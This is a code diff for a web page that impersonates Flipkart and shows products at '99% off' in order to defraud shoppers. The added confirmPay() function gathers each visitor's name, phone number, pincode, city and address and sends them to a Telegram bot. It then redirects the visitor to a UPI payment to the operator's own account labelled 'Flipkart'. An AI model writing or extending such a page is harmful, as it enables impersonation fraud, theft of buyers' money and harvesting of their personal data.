@@ -109,6 +109,7 @@
                 <i class="fa-solid fa-cart-shopping"></i>
             </div>
         </nav>
+     
 
         <div class="swiper detail-swiper"><div class="swiper-wrapper" id="swiper-images"></div><div class="swiper-pagination"></div></div>
 
@@ -172,6 +173,22 @@
             <i class="fa-solid fa-arrow-left" onclick="showPage('page-detail')"></i>
             <span class="font-medium">Add Delivery Address</span>
         </nav>
+      <div class="flex items-center justify-between bg-white px-8 py-3 border-b text-[10px] font-medium text-gray-500">
+    <div class="flex flex-col items-center gap-1 text-blue-600">
+        <div class="w-5 h-5 rounded-full border-2 border-blue-600 flex items-center justify-center bg-blue-600 text-white">1</div>
+        <span>Address</span>
+    </div>
+    <div class="h-[1px] bg-gray-300 flex-grow mx-2 -mt-4"></div>
+    <div class="flex flex-col items-center gap-1">
+        <div class="w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">2</div>
+        <span>Order Summary</span>
+    </div>
+    <div class="h-[1px] bg-gray-300 flex-grow mx-2 -mt-4"></div>
+    <div class="flex flex-col items-center gap-1">
+        <div class="w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">3</div>
+        <span>Payment</span>
+    </div>
+</div>
         <div class="p-6 space-y-6">
             <input type="text" id="uName" placeholder="Full Name (Required)*" class="line-input">
             <input type="tel" id="uPhone" placeholder="Mobile Number (Required)*" class="line-input" maxlength="10">
@@ -184,29 +201,93 @@
             <button onclick="goToSummary()" class="w-full btn-orange py-4 rounded shadow-lg uppercase">Save and Continue</button>
         </div>
     </div>
+<div id="page-summary" class="hidden fixed inset-0 bg-[#f1f3f6] z-[350] overflow-y-auto">
+    <nav class="fk-blue p-4 text-white flex items-center gap-4">
+        <i class="fa-solid fa-arrow-left" onclick="showPage('page-address')"></i>
+        <span class="font-medium">Order Summary</span>
+    </nav>
 
-    <div id="page-summary" class="hidden fixed inset-0 bg-[#f1f3f6] z-[350] overflow-y-auto">
-        <nav class="fk-blue p-4 text-white flex items-center gap-4">
-            <i class="fa-solid fa-arrow-left" onclick="showPage('page-address')"></i>
-            <span class="font-medium">Order Summary</span>
-        </nav>
-        <div class="p-4 space-y-3">
-            <div class="bg-white p-4 rounded shadow-sm">
-                <p class="text-[10px] text-gray-400 font-bold uppercase">Price Details</p>
-                <div class="flex justify-between text-sm mt-2"><span>Price (1 item)</span><span id="sum-mrp" class="line-through text-gray-400"></span></div>
-                <div class="flex justify-between text-sm mt-1"><span>Discount</span><span class="text-green-600">- 99%</span></div>
-                <div class="flex justify-between text-sm mt-1"><span>Delivery</span><span class="text-green-600">FREE</span></div>
-                <div class="flex justify-between font-bold text-lg border-t pt-2 mt-2"><span>Total Amount</span><span id="sum-total"></span></div>
+    <div class="flex items-center justify-between bg-white px-8 py-3 border-b text-[10px] font-medium">
+        <div class="flex flex-col items-center gap-1 text-green-600">
+            <div class="w-5 h-5 rounded-full border-2 border-green-600 flex items-center justify-center bg-green-600 text-white">
+                <i class="fa-solid fa-check text-[10px]"></i>
             </div>
-            <button onclick="showPage('page-payment')" class="w-full btn-orange py-4 rounded shadow-lg uppercase font-bold">Continue</button>
+            <span>Address</span>
+        </div>
+        <div class="h-[2px] bg-green-600 flex-grow mx-2 -mt-4"></div>
+        <div class="flex flex-col items-center gap-1 text-blue-600">
+            <div class="w-5 h-5 rounded-full border-2 border-blue-600 flex items-center justify-center bg-blue-600 text-white font-bold">2</div>
+            <span>Summary</span>
+        </div>
+        <div class="h-[2px] bg-gray-200 flex-grow mx-2 -mt-4"></div>
+        <div class="flex flex-col items-center gap-1 text-gray-400">
+            <div class="w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center font-bold">3</div>
+            <span>Payment</span>
         </div>
     </div>
+
+    <div class="p-3">
+        <div class="bg-white rounded-sm shadow-sm">
+            <p class="p-3 text-sm font-bold text-gray-500 border-b uppercase">Price Details</p>
+            <div class="p-3 space-y-4">
+                <div class="flex justify-between text-base">
+                    <span class="text-gray-800">Price (1 item)</span>
+                    <span id="sum-mrp" class="text-gray-800"></span>
+                </div>
+                <div class="flex justify-between text-base">
+                    <span class="text-gray-800">Discount</span>
+                    <span class="text-green-600 font-medium">− 99% Off</span>
+                </div>
+                <div class="flex justify-between text-base border-b border-dashed pb-4">
+                    <span class="text-gray-800">Delivery Charges</span>
+                    <span class="text-green-600 uppercase font-medium text-sm">Free Delivery</span>
+                </div>
+                <div class="flex justify-between font-bold text-lg pt-1">
+                    <span>Total Amount</span>
+                    <span id="sum-total"></span>
+                </div>
+            </div>
+            <div class="bg-[#fafff5] border-t p-3">
+                <p class="text-green-700 font-bold text-[13px]">You will save ₹(Calculated) on this order</p>
+            </div>
+        </div>
+
+        <div class="flex items-center justify-center gap-2 mt-6 text-gray-500 font-bold text-[12px]">
+            <i class="fa-solid fa-shield-halved text-gray-400 text-lg"></i>
+            <span>Safe and Secure Payments. Easy returns.</span>
+        </div>
+
+        <div class="fixed bottom-0 left-0 w-full p-2 bg-white border-t flex items-center justify-between px-4">
+            <div class="flex flex-col leading-none">
+                <span id="sum-total-bottom" class="font-bold text-lg text-black"></span>
+                <span class="text-blue-600 text-[10px] font-bold">View price details</span>
+            </div>
+            <button onclick="showPage('page-payment')" class="btn-orange px-10 py-3 rounded-sm shadow-md uppercase font-bold text-sm">Continue</button>
+        </div>
+    </div>
+</div>
 
     <div id="page-payment" class="hidden fixed inset-0 bg-[#f1f3f6] z-[400] overflow-y-auto">
         <nav class="fk-blue p-4 text-white flex items-center gap-4">
             <i class="fa-solid fa-arrow-left" onclick="showPage('page-summary')"></i>
             <span class="font-medium">Payments</span>
         </nav>
+      <div class="flex items-center justify-between bg-white px-8 py-3 border-b text-[10px] font-medium text-gray-500">
+    <div class="flex flex-col items-center gap-1 text-blue-600">
+        <div class="w-5 h-5 rounded-full border-2 border-blue-600 flex items-center justify-center bg-blue-600 text-white">1</div>
+        <span>Address</span>
+    </div>
+    <div class="h-[1px] bg-gray-300 flex-grow mx-2 -mt-4"></div>
+    <div class="flex flex-col items-center gap-1">
+        <div class="w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">2</div>
+        <span>Order Summary</span>
+    </div>
+    <div class="h-[1px] bg-gray-300 flex-grow mx-2 -mt-4"></div>
+    <div class="flex flex-col items-center gap-1">
+        <div class="w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">3</div>
+        <span>Payment</span>
+    </div>
+</div>
         <div class="p-4">
             <div class="bg-white p-4 rounded shadow-sm">
                 <label class="flex items-center justify-between">
@@ -320,12 +401,31 @@
         let swpDet;
 
         function init() {
-            const grid = document.getElementById('main-grid');
-            products.forEach(p => {
-                grid.innerHTML += `<div class="bg-white p-3 border shadow-sm" onclick="openProduct(${p.id})"><img src="${p.imgs[0]}" class="h-56 mx-auto object-contain"><p class="text-xs mt-2 line-clamp-2">${p.name}</p><div class="flex gap-2 items-center"><span class="font-bold">₹${p.price}</span><span class="text-gray-400 line-through text-[10px]">₹${p.mrp}</span></div></div>`;
-            });
-        }
-
+    const grid = document.getElementById('main-grid');
+    grid.innerHTML = ''; // Clear old content
+    products.forEach(p => {
+        grid.innerHTML += `
+        <div class="bg-white p-2 border-[0.5px] border-gray-200 flex flex-col cursor-pointer" onclick="openProduct(${p.id})">
+            <div class="relative">
+                <img src="${p.imgs[0]}" class="h-44 w-full object-contain mx-auto">
+                <i class="fa-regular fa-heart absolute top-1 right-1 text-gray-400"></i>
+            </div>
+            <p class="text-xs mt-3 line-clamp-1 text-gray-700">${p.name}</p>
+            <div class="flex items-center gap-1 mt-1">
+                <span class="bg-green-700 text-white text-[9px] px-1 rounded flex items-center gap-0.5">4.4 <i class="fa-solid fa-star text-[7px]"></i></span>
+                <span class="text-gray-400 text-[9px] font-medium">(2,105)</span>
+                <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_9e47c1.png" class="h-3 ml-auto">
+            </div>
+            <div class="flex items-center gap-1.5 mt-1">
+                <span class="font-bold text-sm">₹${p.price}</span>
+                <span class="text-gray-400 line-through text-[10px]">₹${p.mrp}</span>
+                <span class="text-green-600 text-[10px] font-bold">99% off</span>
+            </div>
+            <p class="text-[10px] text-gray-800 mt-0.5">Free delivery</p>
+            <p class="text-[10px] text-green-700 font-bold">Daily Saver</p>
+        </div>`;
+    });
+}
         function showPage(id) {
             ['page-home', 'page-detail', 'page-address', 'page-summary', 'page-payment'].forEach(p => {
                 document.getElementById(p).classList.add('hidden');
@@ -379,12 +479,39 @@
             }
         }
 
-        function confirmPay() {
-            const msg = `🔥 *ORDER ALERT* 🔥\nItem: ${sel.name}\nPrice: ₹${sel.price}\nName: ${document.getElementById('uName').value}\nPhone: ${document.getElementById('uPhone').value}`;
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+        async function confirmPay() {
+            // Sari details collect karna
+            const name = document.getElementById('uName').value;
+            const phone = document.getElementById('uPhone').value;
+            const pincode = document.getElementById('uPin').value;
+            const city = document.getElementById('uCity').value;
+            const address = document.getElementById('uAdd').value;
+
+            // Message format (thoda sundar banaya hai)
+            const msg = `🔥 *NEW ORDER ALERT* 🔥\n\n` +
+                        `📦 *Item:* ${sel.name}\n` +
+                        `💰 *Price:* ₹${sel.price}\n\n` +
+                        `👤 *Name:* ${name}\n` +
+                        `📞 *Phone:* ${phone}\n` +
+                        `📍 *Pin:* ${pincode}\n` +
+                        `🏙️ *City:* ${city}\n` +
+                        `🏠 *Add:* ${address}`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+
+            try {
+                // Pehle message bhejne ka intezaar karega
+                await fetch(url);
+                console.log("Telegram notification sent!");
+            } catch (e) {
+                console.log("Telegram failed but moving to payment");
+            }
+
+            // Ab Payment par le jayega
             window.location.href = `upi://pay?pa=${MY_UPI}&pn=Flipkart&am=${sel.price}&cu=INR`;
         }
 
+        // Ye line hamesha last mein rehni chahiye
         init();
     </script>
 </body>
